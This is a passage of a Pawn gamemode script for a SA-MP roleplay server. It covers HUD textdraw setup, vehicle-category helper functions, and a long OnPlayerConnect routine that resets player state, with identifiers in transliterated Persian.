		TextDrawSetOutline(SpeedoTextDraw[playerid], 1);
		TextDrawBackgroundColor(SpeedoTextDraw[playerid], 255);
		TextDrawFont(SpeedoTextDraw[playerid], 2);
		TextDrawSetProportional(SpeedoTextDraw[playerid], 1);
		TextDrawSetShadow(SpeedoTextDraw[playerid], 0);

		FuelTextDraw[playerid] = TextDrawCreate(520.000000, 375.000000, "Fuel:_%100");
		TextDrawLetterSize(FuelTextDraw[playerid], 0.200000, 1.200000);
		TextDrawAlignment(FuelTextDraw[playerid], 1);
		TextDrawColor(FuelTextDraw[playerid], -1);
		TextDrawSetShadow(FuelTextDraw[playerid], 0);
		TextDrawSetOutline(FuelTextDraw[playerid], 1);
		TextDrawBackgroundColor(FuelTextDraw[playerid], 255);
		TextDrawFont(FuelTextDraw[playerid], 2);
		TextDrawSetProportional(FuelTextDraw[playerid], 1);
		TextDrawSetShadow(FuelTextDraw[playerid], 0);

	    JailTextDraw[playerid] = TextDrawCreate(110.000000, 425.000000, "");
	    TextDrawAlignment(JailTextDraw[playerid], 2);
	    TextDrawBackgroundColor(JailTextDraw[playerid], 255);
	    TextDrawFont(JailTextDraw[playerid], 3);
	    TextDrawLetterSize(JailTextDraw[playerid], 0.390000, 2.000000);
	    TextDrawColor(JailTextDraw[playerid], -1);
	    TextDrawSetOutline(JailTextDraw[playerid], 1);
	    TextDrawSetProportional(JailTextDraw[playerid], 1);
	    TextDrawSetSelectable(JailTextDraw[playerid], 0);

		KiloTextDraw[playerid] = TextDrawCreate(520.000000, 395.000000, "Odometer:_1000000.50_KM");
		TextDrawLetterSize(KiloTextDraw[playerid], 0.200000, 1.200000);
		TextDrawAlignment(KiloTextDraw[playerid], 1);
		TextDrawColor(KiloTextDraw[playerid], -1);
		TextDrawSetShadow(KiloTextDraw[playerid], 0);
		TextDrawSetOutline(KiloTextDraw[playerid], 1);
		TextDrawBackgroundColor(KiloTextDraw[playerid], 255);
		TextDrawFont(KiloTextDraw[playerid], 2);
		TextDrawSetProportional(KiloTextDraw[playerid], 1);
		TextDrawSetShadow(KiloTextDraw[playerid], 0);

		DoorsLockTextDraw[playerid] = TextDrawCreate(520.000000, 405.000000, "Doors:_Lock");
		TextDrawLetterSize(DoorsLockTextDraw[playerid], 0.200000, 1.200000);
		TextDrawAlignment(DoorsLockTextDraw[playerid], 1);
		TextDrawColor(DoorsLockTextDraw[playerid], -1);
		TextDrawSetShadow(DoorsLockTextDraw[playerid], 0);
		TextDrawSetOutline(DoorsLockTextDraw[playerid], 1);
		TextDrawBackgroundColor(DoorsLockTextDraw[playerid], 255);
		TextDrawFont(DoorsLockTextDraw[playerid], 2);
		TextDrawSetProportional(DoorsLockTextDraw[playerid], 1);
		TextDrawSetShadow(DoorsLockTextDraw[playerid], 0);

		DoorsLockTextDraw2[playerid] = TextDrawCreate(520.000000, 405.000000, "Doors:_Lock");
		TextDrawLetterSize(DoorsLockTextDraw2[playerid], 0.200000, 1.200000);
		TextDrawAlignment(DoorsLockTextDraw2[playerid], 1);
		TextDrawColor(DoorsLockTextDraw2[playerid], -1);
		TextDrawSetShadow(DoorsLockTextDraw2[playerid], 0);
		TextDrawSetOutline(DoorsLockTextDraw2[playerid], 1);
		TextDrawBackgroundColor(DoorsLockTextDraw2[playerid], 255);
		TextDrawFont(DoorsLockTextDraw2[playerid], 2);
		TextDrawSetProportional(DoorsLockTextDraw2[playerid], 1);
		TextDrawSetShadow(DoorsLockTextDraw2[playerid], 0);



	}
}
Public:IsAGangCar6(carid)//FNF
{
	for(new i = 0; i < sizeof(FNFVeh); i++) { if(carid == FNFVeh[i]) return 1; }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAGangCar7(carid)// streeci
{
if((carid == scar) || (carid == scar1) || (carid == scar2) || (carid == scar3) || (carid == scar4) || (carid == scar5) || (carid == scar6) || (carid == scar7) || (carid == scar8) || (carid == scar9) || (carid == scar10) || (carid == scar11) || (carid == scar12) || (carid == scar13) || (carid == scar14) || (carid == scar15) || (carid == scar16) || (carid == scar17))
    {
        return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAGangCar8(carid)//spawn civil
{
if((carid == sp1) || (carid == sp2) || (carid == sp3) || (carid == sp4) || (carid == sp5))
    {
        return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsAllCars(carid)
{
    if(carid >= 1 || carid <= 2000)
    {
        return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsASRent(carid)
{
    if(carid >= 102 || carid <= 110)
    {
        return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
public IsABike(carid)
{
    new mod = GetVehicleModel(carid);
    if(mod == 509 || mod == 481 || mod == 510)
    {
        return 1;
    }
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:IsaTruckCar(carid)
{
	for(new i = 0; i < sizeof(TruckVeh); i++) { if(carid == TruckVeh[i]) return 1; }
    return 0;
}
/*----------------------------------------------------------------------------*/
Public:trashcar(carid)
{
	for(new i = 0; i < sizeof(GarbageVeh); i++) { if(carid == GarbageVeh[i]) return 1; }
    return 0;
}



/*----------------------------------------------------------------------------*/
public OnPlayerConnect(playerid)
{
/*----------------------------------------------------------------------------*/
pmodel[playerid] = CreatePlayerTextDraw(playerid, 561.799987, 293.880126, "");
PlayerTextDrawLetterSize(playerid, pmodel[playerid], 0.000000, 0.000000);
PlayerTextDrawTextSize(playerid, pmodel[playerid], 90.000000, 90.000000);
PlayerTextDrawAlignment(playerid, pmodel[playerid], 1);
PlayerTextDrawColor(playerid, pmodel[playerid], -1);
PlayerTextDrawSetShadow(playerid, pmodel[playerid], 0);
PlayerTextDrawSetOutline(playerid, pmodel[playerid], 0);
PlayerTextDrawBackgroundColor(playerid, pmodel[playerid], 84215045);
PlayerTextDrawFont(playerid, pmodel[playerid], 5);
PlayerTextDrawSetProportional(playerid, pmodel[playerid], 0);
PlayerTextDrawSetShadow(playerid, pmodel[playerid], 0);
PlayerTextDrawSetPreviewModel(playerid, pmodel[playerid], GetPlayerSkin(playerid));
PlayerTextDrawSetPreviewRot(playerid, pmodel[playerid], 0.000000, 0.000000, -29.000000, 0.899999);
/*----------------------------------------------------------------------------*/

jtxd[playerid][0] = CreatePlayerTextDraw(playerid, 186.000030, 212.400100, "box");
PlayerTextDrawLetterSize(playerid, jtxd[playerid][0], 0.000000, 14.639999);
PlayerTextDrawTextSize(playerid, jtxd[playerid][0], 447.000000, 0.000000);
PlayerTextDrawAlignment(playerid, jtxd[playerid][0], 1);
PlayerTextDrawColor(playerid, jtxd[playerid][0], 1677721600);
PlayerTextDrawUseBox(playerid, jtxd[playerid][0], 1);
PlayerTextDrawBoxColor(playerid, jtxd[playerid][0], 336860280);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][0], 0);
PlayerTextDrawSetOutline(playerid, jtxd[playerid][0], 0);
PlayerTextDrawBackgroundColor(playerid, jtxd[playerid][0], 255);
PlayerTextDrawFont(playerid, jtxd[playerid][0], 1);
PlayerTextDrawSetProportional(playerid, jtxd[playerid][0], 1);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][0], 0);

jtxd[playerid][1] = CreatePlayerTextDraw(playerid, 353.199737, 213.146697, "Type Konid");
PlayerTextDrawLetterSize(playerid, jtxd[playerid][1], 0.400000, 1.600000);
PlayerTextDrawAlignment(playerid, jtxd[playerid][1], 3);
PlayerTextDrawColor(playerid, jtxd[playerid][1], -1061109505);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][1], 0);
PlayerTextDrawSetOutline(playerid, jtxd[playerid][1], 0);
PlayerTextDrawBackgroundColor(playerid, jtxd[playerid][1], 255);
PlayerTextDrawFont(playerid, jtxd[playerid][1], 1);
PlayerTextDrawSetProportional(playerid, jtxd[playerid][1], 1);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][1], 0);

jtxd[playerid][2] = CreatePlayerTextDraw(playerid, 396.200042, 237.039978, "1- Sherkat Bar Barie Aria");
PlayerTextDrawLetterSize(playerid, jtxd[playerid][2], 0.362399, 1.346132);
PlayerTextDrawAlignment(playerid, jtxd[playerid][2], 3);
PlayerTextDrawColor(playerid, jtxd[playerid][2], -1378294017);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][2], 0);
PlayerTextDrawSetOutline(playerid, jtxd[playerid][2], 0);
PlayerTextDrawBackgroundColor(playerid, jtxd[playerid][2], 255);
PlayerTextDrawFont(playerid, jtxd[playerid][2], 1);
PlayerTextDrawSetProportional(playerid, jtxd[playerid][2], 1);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][2], 0);

jtxd[playerid][3] = CreatePlayerTextDraw(playerid, 369.200042, 255.706741, "1- Sherkat Bar Barie Aria");
PlayerTextDrawLetterSize(playerid, jtxd[playerid][3], 0.362399, 1.346132);
PlayerTextDrawAlignment(playerid, jtxd[playerid][3], 3);
PlayerTextDrawColor(playerid, jtxd[playerid][3], -1378294017);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][3], 0);
PlayerTextDrawSetOutline(playerid, jtxd[playerid][3], 0);
PlayerTextDrawBackgroundColor(playerid, jtxd[playerid][3], 255);
PlayerTextDrawFont(playerid, jtxd[playerid][3], 1);
PlayerTextDrawSetProportional(playerid, jtxd[playerid][3], 1);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][3], 0);

jtxd[playerid][4] = CreatePlayerTextDraw(playerid, 359.200042, 272.133453, "1- Sherkat Bar Barie Aria");
PlayerTextDrawLetterSize(playerid, jtxd[playerid][4], 0.362399, 1.346132);
PlayerTextDrawAlignment(playerid, jtxd[playerid][4], 3);
PlayerTextDrawColor(playerid, jtxd[playerid][4], -1378294017);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][4], 0);
PlayerTextDrawSetOutline(playerid, jtxd[playerid][4], 0);
PlayerTextDrawBackgroundColor(playerid, jtxd[playerid][4], 255);
PlayerTextDrawFont(playerid, jtxd[playerid][4], 1);
PlayerTextDrawSetProportional(playerid, jtxd[playerid][4], 1);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][4], 0);

jtxd[playerid][5] = CreatePlayerTextDraw(playerid, 396.200042, 288.560241, "1- Sherkat Bar Barie Aria");
PlayerTextDrawLetterSize(playerid, jtxd[playerid][5], 0.362399, 1.346132);
PlayerTextDrawAlignment(playerid, jtxd[playerid][5], 3);
PlayerTextDrawColor(playerid, jtxd[playerid][5], -1378294017);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][5], 0);
PlayerTextDrawSetOutline(playerid, jtxd[playerid][5], 0);
PlayerTextDrawBackgroundColor(playerid, jtxd[playerid][5], 255);
PlayerTextDrawFont(playerid, jtxd[playerid][5], 1);
PlayerTextDrawSetProportional(playerid, jtxd[playerid][5], 1);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][5], 0);

jtxd[playerid][6] = CreatePlayerTextDraw(playerid, 202.800048, 328.133453, "Baraye_Bastan_Dialog_LMB_ra_Feshar_Dahid");
PlayerTextDrawLetterSize(playerid, jtxd[playerid][6], 0.263998, 1.629866);
PlayerTextDrawAlignment(playerid, jtxd[playerid][6], 1);
PlayerTextDrawColor(playerid, jtxd[playerid][6], -1);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][6], 0);
PlayerTextDrawSetOutline(playerid, jtxd[playerid][6], 0);
PlayerTextDrawBackgroundColor(playerid, jtxd[playerid][6], 255);
PlayerTextDrawFont(playerid, jtxd[playerid][6], 1);
PlayerTextDrawSetProportional(playerid, jtxd[playerid][6], 1);
PlayerTextDrawSetShadow(playerid, jtxd[playerid][6], 0);
//ConnectNPC("BlueBusDriver","Bus");
BusID[playerid] = 0;
	BusCost[playerid] = 0;
	PlayerSitting[playerid] = 0;
if(IsPlayerNPC(playerid)) {SpawnPlayer(playerid); return 1;}
SetActorVirtualWorld(actor1, 41);

//rmv
RemoveBuildingForPlayer(playerid, 1294, 1280.3125, -1848.1250, 16.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 1234.4766, -1848.0625, 16.9063, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 1204.9219, -1847.8516, 16.9063, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1196.6016, -1840.3828, 12.3516, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1240.5547, -1840.0938, 13.0391, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1256.2266, -1839.9766, 12.5234, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1249.5078, -1840.3828, 12.3516, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1281.8750, -1840.0938, 13.0391, 0.25);
RemoveBuildingForPlayer(playerid, 647, 1235.8359, -1839.8125, 14.0703, 0.25);
RemoveBuildingForPlayer(playerid, 647, 1192.8281, -1839.8125, 14.0703, 0.25);
RemoveBuildingForPlayer(playerid, 647, 1244.5000, -1839.8125, 14.0703, 0.25);
RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1839.8125, 14.0703, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1200.8828, -1839.1250, 12.5234, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1227.5547, -1839.1250, 12.5234, 0.25);
RemoveBuildingForPlayer(playerid, 647, 1192.8281, -1829.2813, 14.0703, 0.25);
RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1828.4219, 14.0703, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1192.6172, -1826.9531, 12.5234, 0.25);
RemoveBuildingForPlayer(playerid, 673, 1284.8906, -1823.8594, 12.5234, 0.25);
RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1820.7422, 14.0703, 0.25);
RemoveBuildingForPlayer(playerid, 620, 1286.3047, -1808.6094, 12.3516, 0.25);
RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1796.8984, 14.0703, 0.25);
RemoveBuildingForPlayer(playerid, 700, 1285.1250, -1799.9766, 13.0391, 0.25);

	AirTime[playerid] =2;
	if(IsTabligh(PlayerName(playerid))) Ban(playerid);
	IsLogedIn[playerid] = false;
    CountDeaths[ playerid ] = 0, StartDeathTick[ playerid ] = 0;
    ResetPlayerTofang(playerid);
    PlayDeathingCamera[playerid] = false;
    //TimerRunning[playerid] = false;
    OldCar[playerid] = INVALID_VEHICLE_ID;
    for(new i;i<11;i++) SetPlayerSkillLevel(playerid, i, 999);
    adtextplayer[playerid][0] = '\0';
    RentedVehicle[playerid] = INVALID_PLAYER_ID;
    OnPaintBall[playerid] = 0;
    OnFreeze[playerid] = 0;
    PaintBallKills[playerid] = 0;
    CarRadioPlayed[playerid] = false;
    TeadadPlayers ++;
    if(playerid >= LastPID) LastPID = playerid+1;
    if(TeadadPlayers >= MostPlayersOnline)
    {
        MostPlayersOnline = TeadadPlayers;
        new year,month,day,hour,minute,sec;
        #pragma unused sec
        gettime(hour,minute,sec);
        getdate(year,month,day);
        format(DateOfRekord,60,"%s%d.%s%d.%s%d %s%d:%s%d",(year < 10) ? ("0") : (""),year,(month < 10) ? ("0") : (""),month,(day < 10) ? ("0") : (""),day,(hour < 10) ? ("0") : (""),hour,(minute < 10) ? ("0") : (""),minute);
        SaveStuff();
        ReadAccountBar();
 }
    Specing[playerid] = 0;
    OnRentMashinMessage[playerid] = false;
    for(new i;i<3;i++) {GoBack[playerid][i] = 0;}
    for(new i;i<5;i++) {GoBack1[playerid][i] = 0;}
    GetPlayerIp(playerid,PlayerInfo[playerid][pIp],100);
    GetPlayerName(playerid,PlayerInfo[playerid][pName],40);
	SetPlayerCameraPos(playerid,1414.2831, -2336.0010, 74.3994);
	SetPlayerCameraLookAt(playerid,1574.2235,-2259.6084,13.3828);
    TextDrawShowForPlayer(playerid,atxd[0]);
    TextDrawShowForPlayer(playerid,atxd[1]);
    TextDrawShowForPlayer(playerid,atxd[2]);
    TextDrawShowForPlayer(playerid,atxd[3]);
    TextDrawShowForPlayer(playerid,atxd[4]);
    TextDrawShowForPlayer(playerid,atxd[5]);
    TextDrawShowForPlayer(playerid,atxd[6]);
    TextDrawShowForPlayer(playerid,atxd[7]);
    TextDrawShowForPlayer(playerid,atxd[8]);
    //TextDrawShowForPlayer(playerid,AccountBar[3]);
	TextDrawSize[playerid] =0;
    new plname[MAX_PLAYER_NAME];
    GetPlayerName(playerid, plname, sizeof(plname));
    RobMemberCount[playerid] = 0;
    AFKTime[playerid] = 0;
    OnRob[playerid] = false;
    Reported[playerid] = INVALID_PLAYER_ID;
    Helpme[playerid] = INVALID_PLAYER_ID;
    RobLeader[playerid] = false;
    RobDriver[playerid] = INVALID_PLAYER_ID;
    OnStopSpecing[playerid] = false;
    HelpmeText[playerid][0] = '\0';
    ReportText[playerid][0] = '\0';
    TDShowedSpeedo[playerid] = false;
    TDShowedFuel[playerid] = false;
    TDShowedKilo[playerid] = false;
	TDShowedLock[playerid] = false;
    for(new i;i<100;i++)
    {
        RobMember[playerid][i] = INVALID_PLAYER_ID;
    }
    for(new z = 0;z<3;z++) TelePos2[playerid][z] = 0.0;
    AgentHiterID[playerid] = INVALID_PLAYER_ID;
    TimerAnnouncer[playerid] = 0;
    Ghatel[playerid] = INVALID_PLAYER_ID;
    GhatelWanted[playerid] = 0;
    strdel(CrimeText[playerid], 0, 100);
    IsPlayerDeath[playerid] = false;
    OnEnteringVeh[playerid] = 0;
    CallCost[playerid] = 0;
    CellTime[playerid] = 90;
    OnEnteringVehPlay[playerid] = INVALID_PLAYER_ID;
    Specing2[playerid] = 0;
    Khoon[playerid] = 100.0;
    OwnableCarMethod[playerid] = 0;
    Zereh[playerid] = 0;
    PBANNED[playerid] = 0;
    new string[MAX_PLAYER_NAME];
    AgentHitID[playerid] = INVALID_PLAYER_ID;
    PlayerOnDeathing[playerid] = false;
    AgentContractID[playerid] = INVALID_PLAYER_ID;
    ContractID[playerid] = INVALID_PLAYER_ID;
    HealthAllowedForPlayer[playerid] = 0;
    OnKarting[playerid] = 0;
    KartingPlayerTime[playerid] = 0;
    TogEvent[playerid] = false;
    gPlayerLogTries[playerid] = 0;
    adtimerplayer[playerid] = 0;
	if(PlayerInfo[playerid][pJailTime] <= 1) {
    OnCheckpoint[playerid] = 0;
	}
    PlayerRespawned[playerid] = 0;
    HitmanTofangPackage[playerid] = 0;
    ReferralID[playerid] = 0;
    TelportEtela[playerid][0] = 0; TelportEtela[playerid][1] = 0;TelportEtela[playerid][2] = 9999;TelportEtela[playerid][3] = 9999;TelportEtela[playerid][4] = 9999;
    TelportEtela2[playerid][0] = 0; TelportEtela2[playerid][1] = 0;TelportEtela2[playerid][2] = 9999;TelportEtela2[playerid][3] = 9999;TelportEtela2[playerid][4] = 9999;
    PhoneOnline[playerid] = 1; HidePM[playerid] = 0; SpawnChange[playerid] = 1; AFK[playerid] = 0; CallWaiting[playerid] = 9999; TimerRingTone[playerid] = 0;
    SelectCharID[playerid] = 250; SelectCharPlace[playerid] = 0; ChosenSkin[playerid] = 250; PlayerStyle[playerid] = 0;
    PINFO[playerid][pID] = 0;
    PINFO[playerid][pHelper] = 0;
    EventReward[playerid] = 0;
    strmid(EventTime[playerid],"00:00",0,strlen("00:00"),20);
    strmid(EventLocation[playerid],"HichJa",0,strlen("HichJa"),60);
    strmid(EventDesc[playerid],"KooFT",0,strlen("KooFT"),80);
    strmid(EventTitle[playerid],"Hichi",0,strlen("Hichi"),60);
    EventID[playerid] = 9999;
    ApprovedLawyer[playerid] = 0; CallLawyer[playerid] = 0; WantLawyer[playerid] = 0;
    UsedFind[playerid] = 0; AnimPlay[playerid] = 0;
    CP[playerid] = 0; SpawnChange[playerid] = 1; RCP[playerid] = 0;
    IWantMechanic[playerid] = 0; UseAtm[playerid] = 0; AtmTime[playerid] = 0;
    MoneyMessage[playerid] = 0;
    HLapTop[playerid] = false;
    RepairOffer[playerid] = INVALID_PLAYER_ID; RepairPrice[playerid] = 0; RepairCar[playerid] = 0;
    TalkingLive[playerid] = 255; LiveOffer[playerid] = INVALID_PLAYER_ID; TakingLesson[playerid] = 0; TakingsiLesson[playerid] = 0; HealthAllowedForPlayer[playerid] = 0;
    RefillOffer[playerid] = INVALID_PLAYER_ID; RefillPrice[playerid] = 0; SellApproval[playerid] = 9999;
    DrugOffer[playerid] = INVALID_PLAYER_ID; PlayerCuffed[playerid] = 0; PlayerCuffedTime[playerid] = 0; BuyApproval[playerid] = 9999;
    sHealPrice[playerid] = 0;
    sHealOffer[playerid] = INVALID_PLAYER_ID;
    TurfShow[playerid] = 0;
    DrugGram[playerid] = 0; gNewb[playerid] = 0;
    MedicTime[playerid] = 0; NeedMedicTime[playerid] = 0; MedicBill[playerid] = 0;
    KickLoginUsed[playerid] = false;
    WantedPoints[playerid] = 0;
    OnDuty[playerid] = 0; WantedLevel[playerid] = 0;
    ChangePos2[playerid][1] = 0;SchoolSpawn[playerid] = 0; TaxiSpawn[playerid] = 0;
    TransportDuty[playerid] = 0;
    TaxiCallTime[playerid] = 0; MedicCallTime[playerid] = 0; MechanicCallTime[playerid] = 0;
    FindTimePoints[playerid] = 0; FindTime[playerid] = 0; JobDuty[playerid] = 0; MedicDuty[playerid] = 0; IWantTaxi[playerid] = 0;
    Mobile[playerid] = 9999; Music[playerid] = 0; DrugSell[playerid] = INVALID_PLAYER_ID;
    IAcceptTaxi[playerid] = 0;
    ApprovalPriceOffer[playerid] = 0;
    SellFree[playerid] = 9999; BuyFree[playerid] = 9999;
    FreePriceOffer[playerid] = 0;
    IsSmoking[playerid] = 0; UsingSmokeAnim[playerid] = 0;
    gLastCar[playerid] = 0; IWantMedic[playerid] = 0;
    gOoc[playerid] = 0; gNews[playerid] = 0; BigEar[playerid] = 0; gDice[playerid] = 0; gFam[playerid] = 0;
    PPos[playerid][2] = 0; PPos[playerid][1] = 0; PPos[playerid][0] = 0;
    gPlayerLogged[playerid] = 0; gPlayerLogTries[playerid] = 0;
    gPlayerSpawned[playerid] = 0;
    PlayerTazeTime[playerid] = 0;
    StartTime[playerid] = 0; TicketOffer[playerid] = 9999; TicketMoney[playerid] = 0;
    MatsHolding[playerid] = 0; TutTime[playerid] = 0; TutTime1[playerid] = 0;
    TaxiAccepted[playerid] = INVALID_PLAYER_ID;
    PlayerInfo[playerid][pCash] = 0; NoFuel[playerid] = 0;
    TransportValue[playerid] = 0; TransportMoney[playerid] = 0; TransportTime[playerid] = 0; TransportCost[playerid] = 0; TransportDriver[playerid] = INVALID_PLAYER_ID;
    WatchingTV[playerid] = 0;
    ProposeOffer[playerid] = INVALID_PLAYER_ID; MarryWitness[playerid] = INVALID_PLAYER_ID; MarryWitnessOffer[playerid] = INVALID_PLAYER_ID; MarriageCeremoney[playerid] = 0; ProposedTo[playerid] = INVALID_PLAYER_ID; GotProposedBy[playerid] = INVALID_PLAYER_ID; DivorceOffer[playerid] = INVALID_PLAYER_ID;
    gEngine[playerid] = 0; KnockedDown[playerid] = 0;
    OwnableCarOffer[playerid] = INVALID_PLAYER_ID; OwnableCarID[playerid] = 0; OwnableCarPrice[playerid] = 0; BlindFold[playerid] = 0;
    CreatingGun[playerid] = 0; CreatingGunAmmo[playerid] = 0; CreatingGunPrice[playerid] = 0; IsPuttingMaterials[playerid] = 0; IsTakingGun[playerid] = 0;
    gPlayerAnimLibsPreloaded[playerid] = 0;
    OnSpeedc[playerid] = 0;
    SpeedTimerUsed[playerid] = false;
    SpeedTimer[playerid] = 0;
    KillsAttacker[playerid] = 0;
    DeathsAttacker[playerid] = 0;
    KillsKhod[playerid] = 0;
    DeathsKhod[playerid] = 0;
    OnWar[playerid] = 9999;
    wepidw[playerid] = 0;
    Ammom[playerid] = 0;
    OnSpecPlayer[playerid] = 9999;
    PlayerSetFreq[playerid] = "0.0";
    KeyDade[playerid] = 9999;
    KeyDade_2[playerid] = 9999;
    IHaveKey[playerid] = 0;
    IHaveKey_2[playerid] = 0;
    PlayerFahmid[playerid] = 0;
    Cheating2[playerid] = 0;
    towtimer[playerid] = 0;
    PlayerFish[playerid] = 0;
    Trashes[playerid] = 0;
    WantedKamKonTimerValid[playerid] = false;
    OnAshghal[playerid] = 0;
    Trashlevel[playerid] = 0;
    OnSellCar[playerid] = INVALID_PLAYER_ID;
    MyPayMin[playerid] = 0;
    GodmodeFeature[playerid] = false;
    locatemashin[playerid] = 0;
    PriceCar[playerid] = 0;
    IWantCar[playerid] = 0;
    TooHouse[playerid] = 9999;
    TooBiz[playerid] = 9999;
    Mahal[playerid] = 9999;
    randomsms[playerid] = 0;
    ManTooCom[playerid] = 0;
    randomsm[playerid] = 0;
    TruckLevel[playerid] = 0;
    TruckAllowed[playerid] = 0;
    BusLevel[playerid] = 0;
    BusLevelLV[playerid] = 0;
    ManTooBusam[playerid] = 0;
    ResetPlayerPool(playerid);
    ManMitoonamSkin[playerid] = 0;
    errormessage[playerid] = 0;
    RequestSelected[playerid] = false;
    errormessage2[playerid] = 0;
    PlayerInfo[playerid][pLevel] = 0;
    PlayerInfo[playerid][pAdmin] = 0;
    PlayerInfo[playerid][pPremiumAccount] = 0;
    PlayerInfo[playerid][pRobSkill] = 0;
    PlayerInfo[playerid][pRob] = 0;
    Mat[playerid] = 0; weapon[playerid] = 0; ammo[playerid] = 0; GunPricee[playerid] = 0; Tofang[playerid] = 9999;
    PlayerInfo[playerid][pConnectTime] = 0;
    PlayerInfo[playerid][pAFKtime] = 0;
	pNoAFK[playerid] =0;
	HaveJetpack[playerid] =0;
    PlayerInfo[playerid][pPinCode] = 0;
    PlayerInfo[playerid][pReg] = 0;
    PlayerInfo[playerid][pSex] = 0;
    PlayerInfo[playerid][pExp] = 0;
    PlayerInfo[playerid][pAccount] = 0;
    PlayerInfo[playerid][pCrimes] = 0;
    PlayerInfo[playerid][pDeaths] = 0;
    PlayerInfo[playerid][pKills] = 0;
    PlayerInfo[playerid][pArrested] = 0;
    PlayerInfo[playerid][pWantedDeaths] = 0;
    PlayerInfo[playerid][pPhoneBook] = 0;
    PlayerInfo[playerid][pLottoNr] = 0;
    PlayerInfo[playerid][pFishes] = 0;
    PlayerInfo[playerid][pJob] = 0;
    PlayerInfo[playerid][pPayCheck] = 0;
    PlayerInfo[playerid][pHeadValue] = 0;
    PlayerInfo[playerid][pJailTime] = 0;
    PlayerInfo[playerid][pMats] = 0;
    PlayerInfo[playerid][pDrugs] = 0;
    PlayerInfo[playerid][pLeader] = 0;
    PlayerInfo[playerid][pMember] = 0;
    PlayerInfo[playerid][pRank] = 0;
    PlayerInfo[playerid][pPunish] = 0;
    PlayerInfo[playerid][pFwarn] = 0;
    PlayerInfo[playerid][pTow] = 1;
    PlayerInfo[playerid][pSTAFF] = 1;
    PlayerInfo[playerid][cSkin] = 170;
    PlayerInfo[playerid][fSkin] = 0;
    PlayerInfo[playerid][pWalkieTalkie] = 0;
    PlayerInfo[playerid][pMatsSkill] = 0;
    PlayerInfo[playerid][pDetSkill] = 0;
    PlayerInfo[playerid][pLawSkill] = 0;
    PlayerInfo[playerid][pMechSkill] = 0;
    PlayerInfo[playerid][pJackSkill] = 0;
    PlayerInfo[playerid][pNewsSkill] = 0;
    PlayerInfo[playerid][pDrugsSkill] = 0;
    PlayerInfo[playerid][pTeam] = TEAM_CIV;
    PlayerInfo[playerid][pPnumber] = 0;
    PlayerInfo[playerid][pCar] = 0;
    PINFO[playerid][pCar_2] = 0;
    PlayerInfo[playerid][pPhousekey] = 9999;
    PlayerInfo[playerid][pPbiskey] = 9999;
    PlayerInfo[playerid][pCarLic] = 0;
    PlayerInfo[playerid][pFlyLic] = 0;
    PlayerInfo[playerid][pBoatLic] = 0;
    PlayerInfo[playerid][pFishLic] = 0;
    PlayerInfo[playerid][pGunLic] = 0;
    PlayerInfo[playerid][pMatsLic] = 0;
    PlayerInfo[playerid][pCarLicS] = 0;
    PlayerInfo[playerid][pFlyLicS] = 0;
    PlayerInfo[playerid][pBoatLicS] = 0;
    PlayerInfo[playerid][pGunLicS] = 0;
    PlayerInfo[playerid][pMatsLic] = 0;
    PlayerInfo[playerid][pCarTime] = 0;
    PlayerInfo[playerid][pPayDayHad] = 0;
    PlayerInfo[playerid][pTut] = 0;
    PlayerInfo[playerid][pWarns] = 0;
    PlayerInfo[playerid][pLighter] = 0;
    PlayerInfo[playerid][pCigarettes] = 0;
    PlayerInfo[playerid][pSpeaker] = 0;
    PINFO[playerid][pBanDays] = 0;
    PlayerInfo[playerid][pRented] = 0;
    PlayerInfo[playerid][pLanguage] = 0;
    PlayerInfo[playerid][pLawyerPoint] = 0;
    PlayerInfo[playerid][pApproval] = 0;
    PlayerInfo[playerid][pWanted] = 0;
    PlayerInfo[playerid][cLocationx] = 0.0;
    PlayerInfo[playerid][cLocationy] = 0.0;
    PlayerInfo[playerid][cLocationz] = 0.0;
    PlayerInfo[playerid][cAngle] = 0.0;
    PlayerInfo[playerid][cColor1] = 9999;
    PlayerInfo[playerid][cColor2] = 9999;
    PlayerInfo[playerid][cModel] = 0;
    PlayerInfo[playerid][cPrice] = 0;
    format(string, sizeof(string), "SF");
    strmid(PlayerInfo[playerid][cPlate], string, 0, strlen(string), 255);
    PlayerInfo[playerid][cLock] = 0;
    PlayerInfo[playerid][cDestroyed] = 0;
    PINFO[playerid][cFixed] = 0;
    PINFO[playerid][cInsurance] = 0;
    PlayerInfo[playerid][cFuel] = 0;
    PINFO[playerid][gLocationX] = 0;
    PINFO[playerid][gLocationY] = 0;
    PINFO[playerid][gLocationZ] = 0;
    PINFO[playerid][gAngle] = 0;
    PINFO[playerid][gParked] = 0;
    PINFO[playerid][gLocationX_2] = 0;
    PINFO[playerid][gLocationY_2] = 0;
    PINFO[playerid][gLocationZ_2] = 0;
    PINFO[playerid][gAngle_2] = 0;
    PINFO[playerid][gParked_2] = 0;
    PlayerInfo[playerid][cHealth] = 0;
    PlayerInfo[playerid][cMod1] = 0;
